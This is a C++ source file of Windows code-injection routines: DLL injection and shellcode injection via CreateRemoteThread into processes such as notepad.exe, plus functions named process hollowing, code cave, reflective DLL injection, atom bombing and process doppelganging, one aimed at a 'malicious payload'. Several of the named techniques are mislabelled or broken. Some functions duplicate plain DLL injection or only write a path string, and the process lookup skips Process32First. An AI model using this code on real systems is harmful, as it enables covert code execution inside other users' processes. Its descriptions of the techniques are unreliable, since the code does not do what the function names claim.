#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <string>

using namespace std;

DWORD getPid(string procName)
{
    HANDLE hsnap;
    PROCESSENTRY32 pt;
    hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    do {
        if (procName == pt.szExeFile) {
            DWORD pid = pt.th32ProcessID;
            CloseHandle(hsnap);
            return pid;
        }
    } while (Process32Next(hsnap, &pt));
    CloseHandle(hsnap);
    return 0;
}

bool dllInjection(DWORD pid, const char *dllName)
{
    LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hProcess) {
        LPVOID mem = VirtualAllocEx(hProcess, NULL, strlen(dllName) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (mem != NULL) {
            if (WriteProcessMemory(hProcess, mem, dllName, strlen(dllName) + 1, NULL)) {
                HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, mem, 0, NULL);
                if (hThread != NULL) {
                    WaitForSingleObject(hThread, INFINITE);
                    VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    return true;
                }
            }
        }
        CloseHandle(hProcess);
    }
    return false;
}

bool createSuspendedProcess(const char *path, PROCESS_INFORMATION &pi)
{
    STARTUPINFO si = {};
    si.cb = sizeof(si);
    if (CreateProcess(NULL, (LPSTR)path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return true;
    }
    return false;
}

bool replaceImage(PROCESS_INFORMATION &pi, const char *imagePath)
{
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(pi.hThread, &ctx)) {
        LPVOID remoteImage = VirtualAllocEx(pi.hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (remoteImage != NULL) {
            if (WriteProcessMemory(pi.hProcess, remoteImage, imagePath, strlen(imagePath) + 1, NULL)) {
                ctx.Eax = (DWORD)remoteImage;
                SetThreadContext(pi.hThread, &ctx);
                return true;
            }
        }
    }
    return false;
}

void processHollowing()
{
    const char *targetPath = "C:\\Windows\\System32\\calc.exe"; // Change this to the path of the target executable
    const char *hollowImagePath = "C:\\hollow.exe"; // Path to the hollow PE file

    PROCESS_INFORMATION pi;
    if (createSuspendedProcess(targetPath, pi)) {
        if (replaceImage(pi, hollowImagePath)) {
            ResumeThread(pi.hThread);
        } else {
            TerminateProcess(pi.hProcess, 0);
        }
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

void codeInjection()
{
    const char *shellcode = "\x90\x90\x90\x90"; // Example shellcode, replace with actual shellcode

    string procName = "notepad.exe"; // Replace with target process name
    DWORD pid = getPid(procName);
    if (pid != 0) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (hProcess != NULL) {
            LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteMem != NULL) {
                if (WriteProcessMemory(hProcess, remoteMem, shellcode, strlen(shellcode), NULL)) {
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
                    if (hThread != NULL) {
                        WaitForSingleObject(hThread, INFINITE);
                        CloseHandle(hThread);
                    }
                }
                VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            }
            CloseHandle(hProcess);
        }
    }
}

bool codeCave(DWORD pid, const char *dllName)
{
    LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hProcess) {
        LPVOID mem = VirtualAllocEx(hProcess, NULL, strlen(dllName) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (mem != NULL) {
            if (WriteProcessMemory(hProcess, mem, dllName, strlen(dllName) + 1, NULL)) {
                HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, mem, 0, NULL);
                if (hThread != NULL) {
                    WaitForSingleObject(hThread, INFINITE);
                    VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    return true;
                }
            }
        }
        CloseHandle(hProcess);
    }
    return false;
}

void reflectiveDLLInjection()
{
    const char *dllPath = "C:\\example.dll"; // Path to the DLL you want to inject

    // Open the target process for injection
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (hProcess == NULL) {
        cout << "Failed to open current process for injection." << endl;
        return;
    }

    // Allocate memory in the target process to hold the DLL path
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (remoteMem == NULL) {
        cout << "Failed to allocate memory in the target process." << endl;
        CloseHandle(hProcess);
        return;
    }

    // Write the DLL path to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL)) {
        cout << "Failed to write DLL path to the target process memory." << endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Get the address of the LoadLibrary function in the kernel32 module
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        cout << "Failed to get the address of LoadLibraryA function." << endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Create a remote thread in the target process to execute LoadLibraryA with the DLL path as argument
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMem, 0, NULL);
    if (hThread == NULL) {
        cout << "Failed to create remote thread in the target process." << endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up resources
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    cout << "Reflective DLL injection successful." << endl;
}

void atomBombing()
{
    // Create a global atom
    ATOM atom = GlobalAddAtom("ExampleAtom");
    if (atom != 0) {
        // Find the target process
        DWORD pid = getPid("notepad.exe");
        if (pid != 0) {
            // Open the target process
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (hProcess != NULL) {
                // Allocate memory in the target process to hold the atom name
                LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(ATOM), MEM_COMMIT, PAGE_READWRITE);
                if (remoteMem != NULL) {
                    // Write the atom to the allocated memory in the target process
                    if (WriteProcessMemory(hProcess, remoteMem, &atom, sizeof(ATOM), NULL)) {
                        // Call SetClipboardData function in the target process to execute code
                        HMODULE hUser32 = GetModuleHandle("user32.dll");
                        FARPROC setClipboardData = GetProcAddress(hUser32, "SetClipboardData");
                        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)setClipboardData, remoteMem, 0, NULL);
                        if (hThread != NULL) {
                            WaitForSingleObject(hThread, INFINITE);
                            CloseHandle(hThread);
                        }
                    }
                    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
                }
                CloseHandle(hProcess);
            }
        }
        // Remove the atom
        GlobalDeleteAtom(atom);
    }
}


void processDoppelganging()
{
    // Get the path of the target executable
    const char *targetPath = "C:\\Windows\\System32\\calc.exe"; // Change this to the path of the target executable
    
    // Generate a random name for the new process
    char randomName[MAX_PATH];
    GetTempFileNameA("C:\\Temp", "tmp", 0, randomName);
    
    // Copy the target executable to the new location
    CopyFileA(targetPath, randomName, FALSE);
    
    // Create the new process using the copied file
    PROCESS_INFORMATION pi;
    if (createSuspendedProcess(randomName, pi)) {
        // Replace the image of the newly created process
        if (!replaceImage(pi, "C:\\Path\\To\\MaliciousPayload.exe")) { // Change this to the path of your malicious payload
            TerminateProcess(pi.hProcess, 0);
        }
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

int main()
{
    string procName = "notepad.exe";
    DWORD pid = getPid(procName);
    if (pid != 0) {
        const char *dllName = "example.dll";
        if (dllInjection(pid, dllName)) {
            cout << "DLL injection successful!" << endl;
        } else {
            cout << "DLL injection failed!" << endl;
        }
    } else {
        cout << "Process not found!" << endl;
    }

    return 0;
}
